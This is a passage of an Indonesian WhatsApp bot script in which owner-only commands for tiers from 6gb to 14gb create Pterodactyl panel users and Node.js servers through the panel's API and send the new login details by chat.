let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(panel + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
let user = data.attributes
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let f2 = await fetch(panel + "/api/application/nests/" + netsnya + "/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser
}
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(panel + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let ctf = await m.reply(`*SUCCES CREATE*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Tanggal : ${Kalender91}

*YOUR PANEL*

 • ID : ${user.id}
 • Username : ${user.username}
 • Email : ${user.email}
 • Name : ${user.first_name} ${user.last_name}
 • Bahasa : ${user.language}
 • Admin : ${user.root_admin}

Password telah dikirim di private chat @${u.split`@`[0]}`)

let txt = `
email: ${email}
username: ${username}
password: ${password.toString()}
login: ${panel}

`
let button = [
              {
                 "name": "cta_copy",
                 "buttonParamsJson": `{\"display_text\":\"Username\",\"id\":\"123456789\",\"copy_code\":\"${username}\"}`
              },{
                 "name": "cta_copy",
                 "buttonParamsJson": `{\"display_text\":\"Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": `{\"display_text\":\"Login\",\"url\":\"${panel}\",\"merchant_url\":\"${panel}\"}`
              }
           ]
sendButtonBiasa(u, `*THIS YOUR ACCOUNT*`, txt, button)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case '6gb': {
if (!isCreator) return tolakk(mess.OnlyOwner)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Buat Dengan Cara!*
isi nama 👇🏾   nomor mu 👇🏾
${prefix + command} namamu,${nomore}`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + " 6gb"
let egg = eggsnya
let loc = location
let memo = "6200"
let cpu = "140"
let disk = "6200"
let email = username + "@gmail.com"
if (!u) return
let d = (await vreden.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(panel + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
let user = data.attributes
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let f2 = await fetch(panel + "/api/application/nests/" + netsnya + "/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser
}
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(panel + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let ctf = await m.reply(`*SUCCES CREATE*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Tanggal : ${Kalender91}

*YOUR PANEL*

 • ID : ${user.id}
 • Username : ${user.username}
 • Email : ${user.email}
 • Name : ${user.first_name} ${user.last_name}
 • Bahasa : ${user.language}
 • Admin : ${user.root_admin}

Password telah dikirim di private chat @${u.split`@`[0]}`)

let txt = `
email: ${email}
username: ${username}
password: ${password.toString()}
login: ${panel}

`
let button = [
              {
                 "name": "cta_copy",
                 "buttonParamsJson": `{\"display_text\":\"Username\",\"id\":\"123456789\",\"copy_code\":\"${username}\"}`
              },{
                 "name": "cta_copy",
                 "buttonParamsJson": `{\"display_text\":\"Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": `{\"display_text\":\"Login\",\"url\":\"${panel}\",\"merchant_url\":\"${panel}\"}`
              }
           ]
sendButtonBiasa(u, `*THIS YOUR ACCOUNT*`, txt, button)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case '7gb': {
if (!isCreator) return tolakk(mess.OnlyOwner)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Buat Dengan Cara!*
isi nama 👇🏾   nomor mu 👇🏾
${prefix + command} namamu,${nomore}`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + " 7gb"
let egg = eggsnya
let loc = location
let memo = "7200"
let cpu = "160"
let disk = "7200"
let email = username + "@gmail.com"
if (!u) return
let d = (await vreden.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(panel + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
let user = data.attributes
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let f2 = await fetch(panel + "/api/application/nests/" + netsnya + "/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser
}
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(panel + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let ctf = await m.reply(`*SUCCES CREATE*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Tanggal : ${Kalender91}

*YOUR PANEL*

 • ID : ${user.id}
 • Username : ${user.username}
 • Email : ${user.email}
 • Name : ${user.first_name} ${user.last_name}
 • Bahasa : ${user.language}
 • Admin : ${user.root_admin}

Password telah dikirim di private chat @${u.split`@`[0]}`)

let txt = `
email: ${email}
username: ${username}
password: ${password.toString()}
login: ${panel}

`
let button = [
              {
                 "name": "cta_copy",
                 "buttonParamsJson": `{\"display_text\":\"Username\",\"id\":\"123456789\",\"copy_code\":\"${username}\"}`
              },{
                 "name": "cta_copy",
                 "buttonParamsJson": `{\"display_text\":\"Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": `{\"display_text\":\"Login\",\"url\":\"${panel}\",\"merchant_url\":\"${panel}\"}`
              }
           ]
sendButtonBiasa(u, `*THIS YOUR ACCOUNT*`, txt, button)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case '8gb': {
if (!isCreator) return tolakk(mess.OnlyOwner)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Buat Dengan Cara!*
isi nama 👇🏾   nomor mu 👇🏾
${prefix + command} namamu,${nomore}`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + " 8gb"
let egg = eggsnya
let loc = location
let memo = "8200"
let cpu = "180"
let disk = "8200"
let email = username + "@gmail.com"
if (!u) return
let d = (await vreden.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(panel + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
let user = data.attributes
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let f2 = await fetch(panel + "/api/application/nests/" + netsnya + "/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser
}
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(panel + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let ctf = await m.reply(`*SUCCES CREATE*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Tanggal : ${Kalender91}

*YOUR PANEL*

 • ID : ${user.id}
 • Username : ${user.username}
 • Email : ${user.email}
 • Name : ${user.first_name} ${user.last_name}
 • Bahasa : ${user.language}
 • Admin : ${user.root_admin}

Password telah dikirim di private chat @${u.split`@`[0]}`)

let txt = `
email: ${email}
username: ${username}
password: ${password.toString()}
login: ${panel}

`
let button = [
              {
                 "name": "cta_copy",
                 "buttonParamsJson": `{\"display_text\":\"Username\",\"id\":\"123456789\",\"copy_code\":\"${username}\"}`
              },{
                 "name": "cta_copy",
                 "buttonParamsJson": `{\"display_text\":\"Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": `{\"display_text\":\"Login\",\"url\":\"${panel}\",\"merchant_url\":\"${panel}\"}`
              }
           ]
sendButtonBiasa(u, `*THIS YOUR ACCOUNT*`, txt, button)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case '9gb': {
if (!isCreator) return tolakk(mess.OnlyOwner)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Buat Dengan Cara!*
isi nama 👇🏾   nomor mu 👇🏾
${prefix + command} namamu,${nomore}`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + " 9gb"
let egg = eggsnya
let loc = location
let memo = "9200"
let cpu = "190"
let disk = "9200"
let email = username + "@gmail.com"
if (!u) return
let d = (await vreden.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(panel + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
let user = data.attributes
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let f2 = await fetch(panel + "/api/application/nests/" + netsnya + "/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser
}
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(panel + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let ctf = await m.reply(`*SUCCES CREATE*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Tanggal : ${Kalender91}

*YOUR PANEL*

 • ID : ${user.id}
 • Username : ${user.username}
 • Email : ${user.email}
 • Name : ${user.first_name} ${user.last_name}
 • Bahasa : ${user.language}
 • Admin : ${user.root_admin}

Password telah dikirim di private chat @${u.split`@`[0]}`)

let txt = `
email: ${email}
username: ${username}
password: ${password.toString()}
login: ${panel}

`
let button = [
              {
                 "name": "cta_copy",
                 "buttonParamsJson": `{\"display_text\":\"Username\",\"id\":\"123456789\",\"copy_code\":\"${username}\"}`
              },{
                 "name": "cta_copy",
                 "buttonParamsJson": `{\"display_text\":\"Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": `{\"display_text\":\"Login\",\"url\":\"${panel}\",\"merchant_url\":\"${panel}\"}`
              }
           ]
sendButtonBiasa(u, `*THIS YOUR ACCOUNT*`, txt, button)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case '10gb': {
if (!isCreator) return tolakk(mess.OnlyOwner)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Buat Dengan Cara!*
isi nama 👇🏾   nomor mu 👇🏾
${prefix + command} namamu,${nomore}`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + " 10gb"
let egg = eggsnya
let loc = location
let memo = "10200"
let cpu = "200"
let disk = "10200"
let email = username + "@gmail.com"
if (!u) return
let d = (await vreden.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(panel + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
let user = data.attributes
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let f2 = await fetch(panel + "/api/application/nests/" + netsnya + "/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser
}
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(panel + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let ctf = await m.reply(`*SUCCES CREATE*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Tanggal : ${Kalender91}

*YOUR PANEL*

 • ID : ${user.id}
 • Username : ${user.username}
 • Email : ${user.email}
 • Name : ${user.first_name} ${user.last_name}
 • Bahasa : ${user.language}
 • Admin : ${user.root_admin}

Password telah dikirim di private chat @${u.split`@`[0]}`)

let txt = `
email: ${email}
username: ${username}
password: ${password.toString()}
login: ${panel}

`
let button = [
              {
                 "name": "cta_copy",
                 "buttonParamsJson": `{\"display_text\":\"Username\",\"id\":\"123456789\",\"copy_code\":\"${username}\"}`
              },{
                 "name": "cta_copy",
                 "buttonParamsJson": `{\"display_text\":\"Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": `{\"display_text\":\"Login\",\"url\":\"${panel}\",\"merchant_url\":\"${panel}\"}`
              }
           ]
sendButtonBiasa(u, `*THIS YOUR ACCOUNT*`, txt, button)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case '11gb': {
if (!isCreator) return tolakk(mess.OnlyOwner)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Buat Dengan Cara!*
isi nama 👇🏾   nomor mu 👇🏾
${prefix + command} namamu,${nomore}`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + " 11gb"
let egg = eggsnya
let loc = location
let memo = "11200"
let cpu = "210"
let disk = "11200"
let email = username + "@gmail.com"
if (!u) return
let d = (await vreden.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(panel + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
let user = data.attributes
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let f2 = await fetch(panel + "/api/application/nests/" + netsnya + "/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser
}
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(panel + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let ctf = await m.reply(`*SUCCES CREATE*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Tanggal : ${Kalender91}

*YOUR PANEL*

 • ID : ${user.id}
 • Username : ${user.username}
 • Email : ${user.email}
 • Name : ${user.first_name} ${user.last_name}
 • Bahasa : ${user.language}
 • Admin : ${user.root_admin}

Password telah dikirim di private chat @${u.split`@`[0]}`)

let txt = `
email: ${email}
username: ${username}
password: ${password.toString()}
login: ${panel}

`
let button = [
              {
                 "name": "cta_copy",
                 "buttonParamsJson": `{\"display_text\":\"Username\",\"id\":\"123456789\",\"copy_code\":\"${username}\"}`
              },{
                 "name": "cta_copy",
                 "buttonParamsJson": `{\"display_text\":\"Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": `{\"display_text\":\"Login\",\"url\":\"${panel}\",\"merchant_url\":\"${panel}\"}`
              }
           ]
sendButtonBiasa(u, `*THIS YOUR ACCOUNT*`, txt, button)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case '12gb': {
if (!isCreator) return tolakk(mess.OnlyOwner)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Buat Dengan Cara!*
isi nama 👇🏾   nomor mu 👇🏾
${prefix + command} namamu,${nomore}`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + " 12gb"
let egg = eggsnya
let loc = location
let memo = "12200"
let cpu = "220"
let disk = "12200"
let email = username + "@gmail.com"
if (!u) return
let d = (await vreden.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(panel + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
let user = data.attributes
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let f2 = await fetch(panel + "/api/application/nests/" + netsnya + "/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser
}
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(panel + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let ctf = await m.reply(`*SUCCES CREATE*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Tanggal : ${Kalender91}

*YOUR PANEL*

 • ID : ${user.id}
 • Username : ${user.username}
 • Email : ${user.email}
 • Name : ${user.first_name} ${user.last_name}
 • Bahasa : ${user.language}
 • Admin : ${user.root_admin}

Password telah dikirim di private chat @${u.split`@`[0]}`)

let txt = `
email: ${email}
username: ${username}
password: ${password.toString()}
login: ${panel}

`
let button = [
              {
                 "name": "cta_copy",
                 "buttonParamsJson": `{\"display_text\":\"Username\",\"id\":\"123456789\",\"copy_code\":\"${username}\"}`
              },{
                 "name": "cta_copy",
                 "buttonParamsJson": `{\"display_text\":\"Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": `{\"display_text\":\"Login\",\"url\":\"${panel}\",\"merchant_url\":\"${panel}\"}`
              }
           ]
sendButtonBiasa(u, `*THIS YOUR ACCOUNT*`, txt, button)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case '13gb': {
if (!isCreator) return tolakk(mess.OnlyOwner)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Buat Dengan Cara!*
isi nama 👇🏾   nomor mu 👇🏾
${prefix + command} namamu,${nomore}`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + " 13gb"
let egg = eggsnya
let loc = location
let memo = "13200"
let cpu = "230"
let disk = "13200"
let email = username + "@gmail.com"
if (!u) return
let d = (await vreden.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(panel + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
let user = data.attributes
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let f2 = await fetch(panel + "/api/application/nests/" + netsnya + "/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser
}
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(panel + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let ctf = await m.reply(`*SUCCES CREATE*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Tanggal : ${Kalender91}

*YOUR PANEL*

 • ID : ${user.id}
 • Username : ${user.username}
 • Email : ${user.email}
 • Name : ${user.first_name} ${user.last_name}
 • Bahasa : ${user.language}
 • Admin : ${user.root_admin}

Password telah dikirim di private chat @${u.split`@`[0]}`)

let txt = `
email: ${email}
username: ${username}
password: ${password.toString()}
login: ${panel}

`
let button = [
              {
                 "name": "cta_copy",
                 "buttonParamsJson": `{\"display_text\":\"Username\",\"id\":\"123456789\",\"copy_code\":\"${username}\"}`
              },{
                 "name": "cta_copy",
                 "buttonParamsJson": `{\"display_text\":\"Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": `{\"display_text\":\"Login\",\"url\":\"${panel}\",\"merchant_url\":\"${panel}\"}`
              }
           ]
sendButtonBiasa(u, `*THIS YOUR ACCOUNT*`, txt, button)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case '14gb': {
if (!isCreator) return tolakk(mess.OnlyOwner)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Buat Dengan Cara!*
isi nama 👇🏾   nomor mu 👇🏾
${prefix + command} namamu,${nomore}`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + " 14gb"
let egg = eggsnya
let loc = location
let memo = "14200"
let cpu = "240"
let disk = "14200"
let email = username + "@gmail.com"
if (!u) return
let d = (await vreden.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(panel + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
let user = data.attributes
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let f2 = await fetch(panel + "/api/application/nests/" + netsnya + "/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser
}
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

